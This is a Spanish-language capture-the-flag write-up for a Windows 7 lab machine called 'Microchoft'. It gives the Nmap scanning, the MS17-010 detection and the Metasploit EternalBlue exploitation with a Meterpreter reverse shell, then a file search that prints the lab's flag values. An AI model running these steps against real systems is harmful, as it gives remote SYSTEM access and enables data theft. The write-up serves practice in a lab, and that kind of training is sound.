# Write-Up -- Microchoft

The Hacker Labs

## Información General

-   Nombre: Microchoft\
-   IP: 10.0.50.31\
-   Sistema Operativo: Windows 7 Home Basic 7601 Service Pack 1\
-   Dificultad: Beginner\
-   Objetivo: Obtener acceso inicial y capturar las flags de usuario y
    administrador

------------------------------------------------------------------------

## 1. Reconocimiento

Comenzamos con un escaneo básico de puertos mediante Nmap:

``` bash
nmap -sC -sV 10.0.50.31
```

Resultados relevantes:

    PORT      STATE SERVICE      VERSION
    135/tcp   open  msrpc        Microsoft Windows RPC
    139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
    49152/tcp open  msrpc        Microsoft Windows RPC
    49153/tcp open  msrpc        Microsoft Windows RPC
    49154/tcp open  msrpc        Microsoft Windows RPC
    49155/tcp open  msrpc        Microsoft Windows RPC
    49156/tcp open  msrpc        Microsoft Windows RPC
    49158/tcp open  msrpc        Microsoft Windows RPC

La presencia de Windows 7 SP1 junto a SMB sugiere la posible explotación
de vulnerabilidades conocidas asociadas a SMBv1, especialmente MS17-010
(EternalBlue).

------------------------------------------------------------------------

## 2. Enumeración de vulnerabilidades SMB

``` bash
nmap -p 139,445 --script "smb-vuln*" -sV 10.0.50.31
```

Resultado relevante:

    Host script results:
    | smb-vuln-ms17-010: 
    |   VULNERABLE:
    |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2017-0143
    |     Risk factor: HIGH

La máquina es vulnerable a MS17-010, permitiendo ejecución remota de
código.

------------------------------------------------------------------------

## 3. Explotación con Metasploit (EternalBlue)

### Iniciar Metasploit

``` bash
msfconsole -q
```

### Seleccionar exploit

``` bash
use exploit/windows/smb/ms17_010_eternalblue
```

### Configuración

``` bash
set RHOSTS 10.0.50.31
set LHOST 10.0.50.4
show options
```

Confirmar:

-   RHOSTS = 10.0.50.31\
-   LHOST = 10.0.50.4\
-   PAYLOAD = windows/x64/meterpreter/reverse_tcp

### Lanzar exploit

``` bash
exploit
```

Se obtiene sesión Meterpreter.

------------------------------------------------------------------------

## 4. Post-Explotación

Verificación de privilegios:

``` bash
getuid
```

Resultado:

    Server username: NT AUTHORITY\SYSTEM

Se obtiene acceso con privilegios máximos.

------------------------------------------------------------------------

## 5. Flag de Usuario

``` bash
ls C:\Users
cat C:\Users\Lola\Desktop\user.txt
```

Flag:

    13e624146d31ea232c850267c2745caa

------------------------------------------------------------------------

## 6. Flag de Administrador

Búsqueda manual de archivos:

``` bash
search -f root.txt -d C:\
search -f flag.txt -d C:\
```

Búsqueda avanzada desde shell:

``` cmd
for /r %i in (*.txt) do @type "%i" 2>nul | findstr /r "[a-fA-F0-9]\{30,\}" >nul && echo [FOUND] %i && type "%i"
```

Archivo encontrado:

    C:\Users\Admin\Desktop\admin.txt.txt

Contenido:

    ff4ad2daf333183677e02bf8f67d4dca

------------------------------------------------------------------------

## Conceptos Aprendidos

-   Escaneo de puertos TCP con Nmap\
-   Enumeración de servicios Windows\
-   Identificación de vulnerabilidad MS17-010\
-   Explotación con Metasploit\
-   Uso de Meterpreter\
-   Obtención de flags en sistemas Windows

------------------------------------------------------------------------

## Conclusión

Microchoft es una máquina enfocada en la explotación de EternalBlue
(MS17-010) sobre Windows 7 SP1 con SMBv1 habilitado.

El laboratorio permite practicar el flujo completo: reconocimiento,
enumeración, explotación y post-explotación en entornos Windows.
